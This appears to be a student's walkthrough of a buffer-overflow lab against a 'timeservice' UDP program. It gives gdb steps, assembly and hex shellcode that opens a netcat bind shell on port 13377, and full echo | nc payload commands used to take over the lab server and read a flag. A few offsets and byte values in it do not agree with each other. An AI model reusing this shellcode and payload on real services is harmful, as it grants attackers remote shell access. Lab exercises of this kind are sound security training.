Practical Task - 3 Buffer Overflow

Step 1 - Firstly, log into the chuck server -> enter "ifconfig -a" to list all the available network interfaces on Chuck's Machine
Step 2 - Run the command "ping -I eth1 -c3 10.12.27.03" to verify the connection
Step 3 - Run the command "nc -u 10.12.27.03" to check the availability of the timeservice
Step 4 - Open and edit the Makefile
	 run "vi Makefile" -> save and quit the file

Step 5 - Now Compile the timeservice file

===>run the command "make -B"


Step 6: Starting the timeservice with the help of gdb



===> run the command "gdb ./timeservice"

Step 7: Inside the debugger configure GDB for Debugging

Set breakpoints at critical lines:

In the given code, memcpy function is identified as a vulnerable function, setting the first breakpoint at line 37:

===> type "break 37"

Place the second breakpoint at the end of the get_time function on line 48:

===> type "break 48"

Lastly, set the third breakpoint in the main function where get_time is called, line 165:

===> type "break 165"

Configure GDB to follow fork mode that instructs GDB to follow the child process when a fork system call is encountered

===> type "set follow-fork-mode child"


Step 8: Run the timeservice in the locahost chuck machine mentioning ip address and the port number 

===> Use "run 127.0.0.1 2228"


Step 9: Triggering Buffer Overflow in the second terminal

In this Python script is used to generate a payload causing a buffer overflow:

===> python3 -c "import sys;filler = '\x00'+'\x41'*124+'\x42'*4;sys.stdout.buffer.write(filler.encode('latin-1'))" | nc -u 127.0.0.1 2228

After passing the payload via another terminal it hits the get_time breakpoint which is set at line number 165

Thread 3.1 "timeservice" hit Breakpoint 3, main (argc=3, argv=0xffffd744) at timeservice.c:165
165           get_time(msgbuf, returnstr, received);

To obtain the memory address of the msgbuf which we are going to use it as the return address of the shellcode injection,
use  " p &msgbuf"  for which we fot the output as:
$1 = (char (*)[256]) 0x804b300 <msgbuf>

Then type "continue" 

Thread 3.1 "timeservice" hit Breakpoint 1, get_time (format=0x804b300 <msgbuf> "", retstr=0x804c1a0 "", received=149) at timeservice.c:37
37        memcpy(timebuf,format,received);

Once the above output is received type the following commands to obtain the length that is overwritten
(gdb)===> type "p &timebuf"
$2 = (char (*)[128]) 0xffffd58c

(gdb)===> type "p &format"  
$3 = (char **) 0xffffd620

(gdb)===> type "p/d 0xffffd620 - 0xffffd58c"
$4 = 148

The actual size of the buffer is known by which the 148 bytes of payload should be constructed for the exploitation of the attack.

Step 10: Preparing the Shellcode

To create the shellcode, assemble the following assembly code: (we already have this code in exit.asm)

============================ Shell Code start ============================
section .text
    global _start

_start:
    xor ebx, ebx            ; Clear EBX (set to 0)
    pop eax                 ; Set EAX to 0x00
    int 0x80                ; Execute syscall (null operation for clearing registers)

    xor eax, eax            ; Clear EAX
    xor edx, edx            ; Clear EDX

    push 0x37373333         ; Push "3377" onto the stack
    push 0x3170762d         ; Push "-vp1" onto the stack
    mov edx, esp            ; Move pointer to "-vp13377" into EDX
    push eax                ; Push NULL terminator

    push 0x68732f6e         ; Push "n/sh" onto the stack
    push 0x69622f65         ; Push "e/bi" onto the stack
    push 0x76766c2d         ; Push "-lvv" onto the stack
    mov ecx, esp            ; Move pointer to "-lvve/bin/sh" into ECX
    push eax                ; Push NULL terminator

    push 0x636e2f2f         ; Push "//nc" onto the stack
    push 0x2f2f2f2f         ; Push "////" onto the stack
    push 0x6e69622f         ; Push "/bin" onto the stack
    mov ebx, esp            ; Move pointer to "/bin////nc" into EBX
    push eax                ; Push NULL terminator

    push edx                ; Push pointer to "-vp13377" argument
    push ecx                ; Push pointer to "-lvve/bin/sh" argument
    push ebx                ; Push pointer to "/bin////nc" argument

    xor edx, edx            ; Clear EDX (set it to NULL)
    mov ecx, esp            ; Point ECX to the argument array
    mov al, 0x0b            ; Set AL to 0xb (execve syscall)
    int 0x80                ; Trigger syscall


============================ Shell Code end ============================



# To Compile the assembly code using NASM
===>run the command "nasm -f elf32 exit.asm"

# To Create an object file
===> run the command "ld -m elf_i386 -o exiter exit.o"

# To Disassemble the object file
===> run the command "objdump -M intel -d exiter"


Step 11: Generating Shellcode of 69 bytes that is obtained from object file
===> 


x31\xdb\x58\xcd\x80\x31\xc0\x31\xd2\x68\x33\x33\x37\x37\x68\x2d\x76
\x70\x31\x89\xe2\x50\x68\x6e\x2f\x73\x68\x68\x65\x2f\x62\x69\x68\x2d
\x6c\x76\x76\x89\xe1\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x2f\x2f\x2f\x68
\x2f\x62\x69\x6e\x89\xe3\x50\x52\x51\x53\x31\xd2\x89\xe1\xb0\x0b\xcd\x80


Step 12: Payload Creation

Inside our payload, we'll structure it to be 148 bytes long. This breakdown will include:

    69 bytes of shellcode
    1 byte of null byte
    4 bytes for the return address
    74 bytes of NOP (No Operation) sled code

The payload format will be as follows:

	\x00                # 1 byte null byte
	\x90\x90...\x90     # 24 NOP (\x90) operations
	\x31\xc0\x50...\x80 # 69 bytes of shellcode
	\x90\x90...\x90     # 50 NOP (\x90) operations
	\xc1\xb3\x04\x08    # 4 bytes of return address

Note: The return address is adjusted from 0x0804b300 to 0x0804b305, reflecting a slight modification for the Intel architecture.

Check if the shellcode works with local chuck machine by using:

echo -ne "\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x58\xcd\x80\x31\xc0\x31\xd2\x68\x33\x33\x37\x37\x68\x2d\x76\x70\x31\x89\xe2\x50\x68\x6e\x2f\x73\x68\x68\x65\x2f\x62\x69\x68\x2d\x6c\x76\x76\x89\xe1\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x52\x51\x53\x31\xd2\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x05\xb3\x04\x08" | nc -u 127.0.0.1 2222

Open another terminal, connect to the Chuck's machine:
====> nc 127.0.0.1 13377

Check if connection is established and able to access the files.

Step 13: Attack Server by Injecting Shellcode

Objective:
Sending a payload to gain control of the target server, specifically time on port 2222.
Shellcode Injection Command

The following command is used to send the payload:
===> 
echo -ne "\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x58\xcd\x80\x31\xc0\x31\xd2\x68\x33\x33\x37\x37\x68\x2d\x76\x70\x31\x89\xe2\x50\x68\x6e\x2f\x73\x68\x68\x65\x2f\x62\x69\x68\x2d\x6c\x76\x76\x89\xe1\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x52\x51\x53\x31\xd2\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x05\xb3\x04\x08" | nc -u time 2222


Connecting to the Server's Built Port
===> nc time 13377


Step 14: Now Retrieve secret.txt
Accessing Files After Gaining Control

change the directory by cd ..
===> use ls to list "ls" command and identify "secret.txt"
===> Read the contents of secret.txt using the command "cat secret.txt"

The obtained CTF content is: CTF{secret-iCpKOHIsGFxszDnlHiFC}



